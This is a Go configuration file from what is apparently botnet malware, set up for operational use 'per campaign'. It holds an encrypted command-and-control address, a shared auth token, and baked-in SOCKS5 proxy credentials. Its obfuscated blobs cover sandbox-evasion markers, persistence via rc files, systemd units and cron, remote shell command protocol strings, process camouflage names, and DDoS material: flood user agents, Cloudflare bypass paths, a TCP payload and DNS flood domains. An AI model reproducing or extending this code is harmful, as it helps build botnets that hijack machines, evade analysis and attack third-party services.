package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "b31e916d" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "4J*sgOVnQuQ@TpvT" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "r3.7-stable" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "COGXeSPF3zja"    //change me run setup.py
var proxyPass = "EJQE1vd8bpaB"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	binLabel    string
	unitPath    string
	unitName    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("3436650eb68b708db7246b87ce5cea79f21c8c1c67064bb49c178716b766dc4bf89ce7f7dd958d8f9f99925a5867f1bae513968dfa1c1a5a05363a690a144593dbff37cb196c23a1") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("d6e44879d8973faf4733aa038bb5c78d6a4b554c4b3c612dc9a829a5382fe4174455eee37b28b6e0a60947b15878c924a19e63b5f724e1a5ed44814bce7558795ebb6e27ee4c9de691cd53941141f0cb1a5688c2bdec6988402123726547d6531201172c164a7c52a1754615cb11d799d4b515f69b")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("62b5c14bf49fc8378ea8530ee718c2c569d5b6de4544935e3e397d44b9fb194fcdb3307565134fbd09eafbe54db20e80d218817cc9ce709477d373548253f870c4fe3868daf19882f1de")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("7565a9254a7e62642d0de30c4f6b5809e820b970714d51596d4a7212e6977d07")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("49c08cfc75623f920896f4ef090c74f488c4c1dbc06fb738be4ed3e068")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("89b069a62ea53078da9573ba0063013283bab4d0528ac46efc6af4c3a5289683503041cea0")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("ea23475c1b07dbabb5513df9910d792471b8b2c2c55b14fa70f32c65cf")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("152e0386bf27ccb7457cf6b36e39aa09556637d0d697b274fe8f0839ba4252c3219f2ee50bb4d5b64e3ea3b06cab37ebf56eb4561f06e1")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("ec82f467cab69c17ba25e9b92f2a9a6607ce4ca28edfc7aa505eb39010eb28f4252184")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("be5383bc2d038326dcf71431304addb4b03f0c2af6872b7d78")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("9452a592f0a08f530edd8655f381f59cb451cc9bd3f239e48a824b7c89")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("7f4b58b51b63fad1db2c8f92fd6762a944de3bc6c84302e8670543a98a7045e897f8d0cc940878")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("1105310fe417ab3696c61af19a262e647a3204c00605ff1b48056897220a09795d71883cce8a3c82e4fed5")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("6bee8d037e11d260b75d5e43830caa22bc347ecba8b494a5c13eddc5be9d0b")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("babae0a6cdedec32155fd20f1188837be9ba46faf440fcb8af441cc2")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("02c9a1bb027e20073d85ada51ab22ad455d4cb1238f25a81a4415b961c5bb36f80d118121472f0db85acdd6b6025a56d")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("e8db535ccc9cc3312357574562ddc12e3ab0ae3e")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("c0fda7dfa845a9470d3bc367cca00ad28b94b9e31b")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("9458a3ca145a240052ac8c619be0300c06af6841573d06dfe179c057641cdb")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("1f2b93844a096ae372e25b018aaa16fa73deba852a436541017d")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("ad1eed26a2d4c5df84ab5f42ab344ad9f5e36cc61d26eb7d6cc29f")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("5a31ce6c597db9af2b4be3945333af70d48c61339b785fb0212b17")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("81982ad7bb7f69bbdf66103a178d0f225ad251c5b46faef77ebdd62499b07d")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("67b55cebede975cd2b7bd6e170140182ab6860d8c505fddca9a1309a9daea056f56a7c06b0530b2749bbdb1e4137a5f20211b7ebf3")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("789997aba78ebe3cd0479f3b80ccccc3f3baa5115ca55a67fb")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("941eb098279f4342782af0a7c4e5c19a141a424833b267a5ccfa7ba62eb6be75efd7")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("0e1dcaa94387045b3576e205f06fefc0ffafbb426abdebd099978899b4cd6c93e92ec11a68310b98965492b8b658")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("ab21a0d90b3408ca0334fde6e34203b2a02ed644b514375f129e9550fcd6c123f54166c9d73fa0dda16e8e10")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("1482f4799976fee96e206a0ce574810b280436a0e588e9dd0df56bdbe2c6081d008646fefd26fdd6a9c359561ed309faed54a58d8de3267aa1b6")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("9bec59a8be64516930ea7f98362ca0e950def9efc875fb4fe25235b352c3e00a")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("e55f76f39660934c624a194621eb4259f82f8ad78a631c0e09cce74e67bd42f4fa2d733ec4d3d7d22c0327e4327673a1")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("92a3669f713176fc4e4fa2bb687bd9dfa619f830a516296275a1fce354250b682ae2f61b99")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("213290b0a7c28a4dabeff2762a96ff88f5bb5d848f5a1e6a38f69264887c357ece76385d63d6d38d4166c958f93429")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("81305a59b500bff04f2a7dcb755a7e7c37cc9c047a7db45b168a5ee01998dd9854facb5ee86caf95e001e80d36997c7c8e7c3743d2f34ca1431103c55b868dadbca5c9b2236659b486352a0e78cbd248541399eca0d17bf4810d86bcf7432c851d4a7e05b1c1775245ffc745a1ad68fde7")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("01a470763a8fae5f7206669bd0d413bc2a09bb2fe127eaf1c01f5fa92aeda1c229489b9542697ed39e5a0ee2132e408833e7a76fffc26dfa524c6a18abee2bcc1f647df82a67161b211e1f85f4947d6e41")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("c94da1d5ae9e348b577d6aeb403cb85f3ae681af6103c4bd84e0e1db40d2be8e41728d39452a5a020e6b372a04a785715db436068246d876ecaf59ef981c27994982a3f279c8562bef70bb2f17bc")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("27b69b27a779f9d9f016ca2995584ae241f300e96f27bca7cb3c34e9f2d423d95ce91b27ff3ccc4482615b03cc2f56847dce88c4be01e286b04d4874184dfafee37938c2e17ff0173011632031")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("1de42689895e15df0105c1960e21bfe51e1b707607166391b86245abb2baebe9c4f6e46d1c45b206fdad5612977bd1b452705138d921d5a65c9f1dbaaf03f7")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("a66384c818769207cd924d26f0927e3526a7bab60de4104a3a8ee53a79c1110ffe47cff7")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("45672c0aaec82b02461e8ed8f0cc86eea66d7217e61c17a9cfe86c3492f5792fbe292504c8692ae6ec261a9b1e0c4b25762fc3e097d55285889d3232b927d54afd4ba700849632fb249775225957f369bfb813b498b4d9520a43ecd026c90a0035a9a04bdc338947205b1e12b60d0d2a456e40da44360936221b0d4ea87b7da9a40105403cb6805ba86d9a99154e2fa69a4ca86151eea6e828e239c297a85fa3dc675394dc30d0bf7f700f9db782030aab61f31909d0075921c47f74919efb2fade853952d232a236436911cf87cbc51faf43b114b673ca95eb6487d66")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("d7949684433540b1364d7654234246f5fe0cbed31c315cf45ed7d8bb0ce1f4aac78df8e23819e30349bc80d3f582a6b951a4167019f30fcd77754a7304362976939fcd4e69c36df191f58aa926ccc630821efad08356a106d0f4ca")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("be1361909f82ec562fa85eaffe805bbb22e3a091de591d40342929c0a6df4926097fe476820ab4b809dd5f0d7d6e1638098ec207b2957402411a28")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("94ccef1d3a6076e5edc6de2e74d56488b27d90c736aed9c22c65a79d5604337df79ac75ac158e0002690f4c8d5da9cfdcbf5b88f4461998c331fd4d4621aadb9930d1dd865ae3a94dc")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("1ab4fcf3549ad5cf4cdc02ead1d02017f8b44d71518b6a")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("7120dc93899b3d583b3ba41bda3ab854a940629cb9b21b492158d123acdd91f1435c")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("0c077c28a36a01950080e10f1efa40c5d10cadaaabd6e1533918e4ef8c17077959d561cf123461d8dc7cb5e6b2afbeeaf0556d2f8f572c55c1d5f5c334d38f41d7572c3d63c343448cfdb70cc1da3fc8a594ecca8ac6cbe0a86bb5e603681b")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("35dbd5359c3b47eaef750cf29a337c6cfa59")

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("888642efd89c6abda5a42d6f9979adaadb73a23714f49080df4caf6a734be495f92ff46202988fb20a7477dacb0f96e6f61e281f45")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("d20694611c82a8e87e07b70298da66f42ed7")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("59983b5bb14cfd9f7570d417e65bb17854e9")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("5325c9f2f2f146156ebc3fc33624e8611b77198adab6")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("8b316a002324a85ecd801745580e3fc58020a104d6f0d6cc")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("59257ba0fc2126d7555032d591c0f4954254a396b1")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("2f3ba0ef1678f6cfc30c3064b1a264754927")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("2e2a00c4f38018cec81e31adc434607ad5eb22877b28c74cb5")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("40ae61208139ad3a5e71e9283252d3b9f0374a888c851730ca")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("26fc924ece918d8e8f85b4c7351d783a6922682ee1ce60")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("415c49972adaa3bda862f4caadadb669f7bd5ac8")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
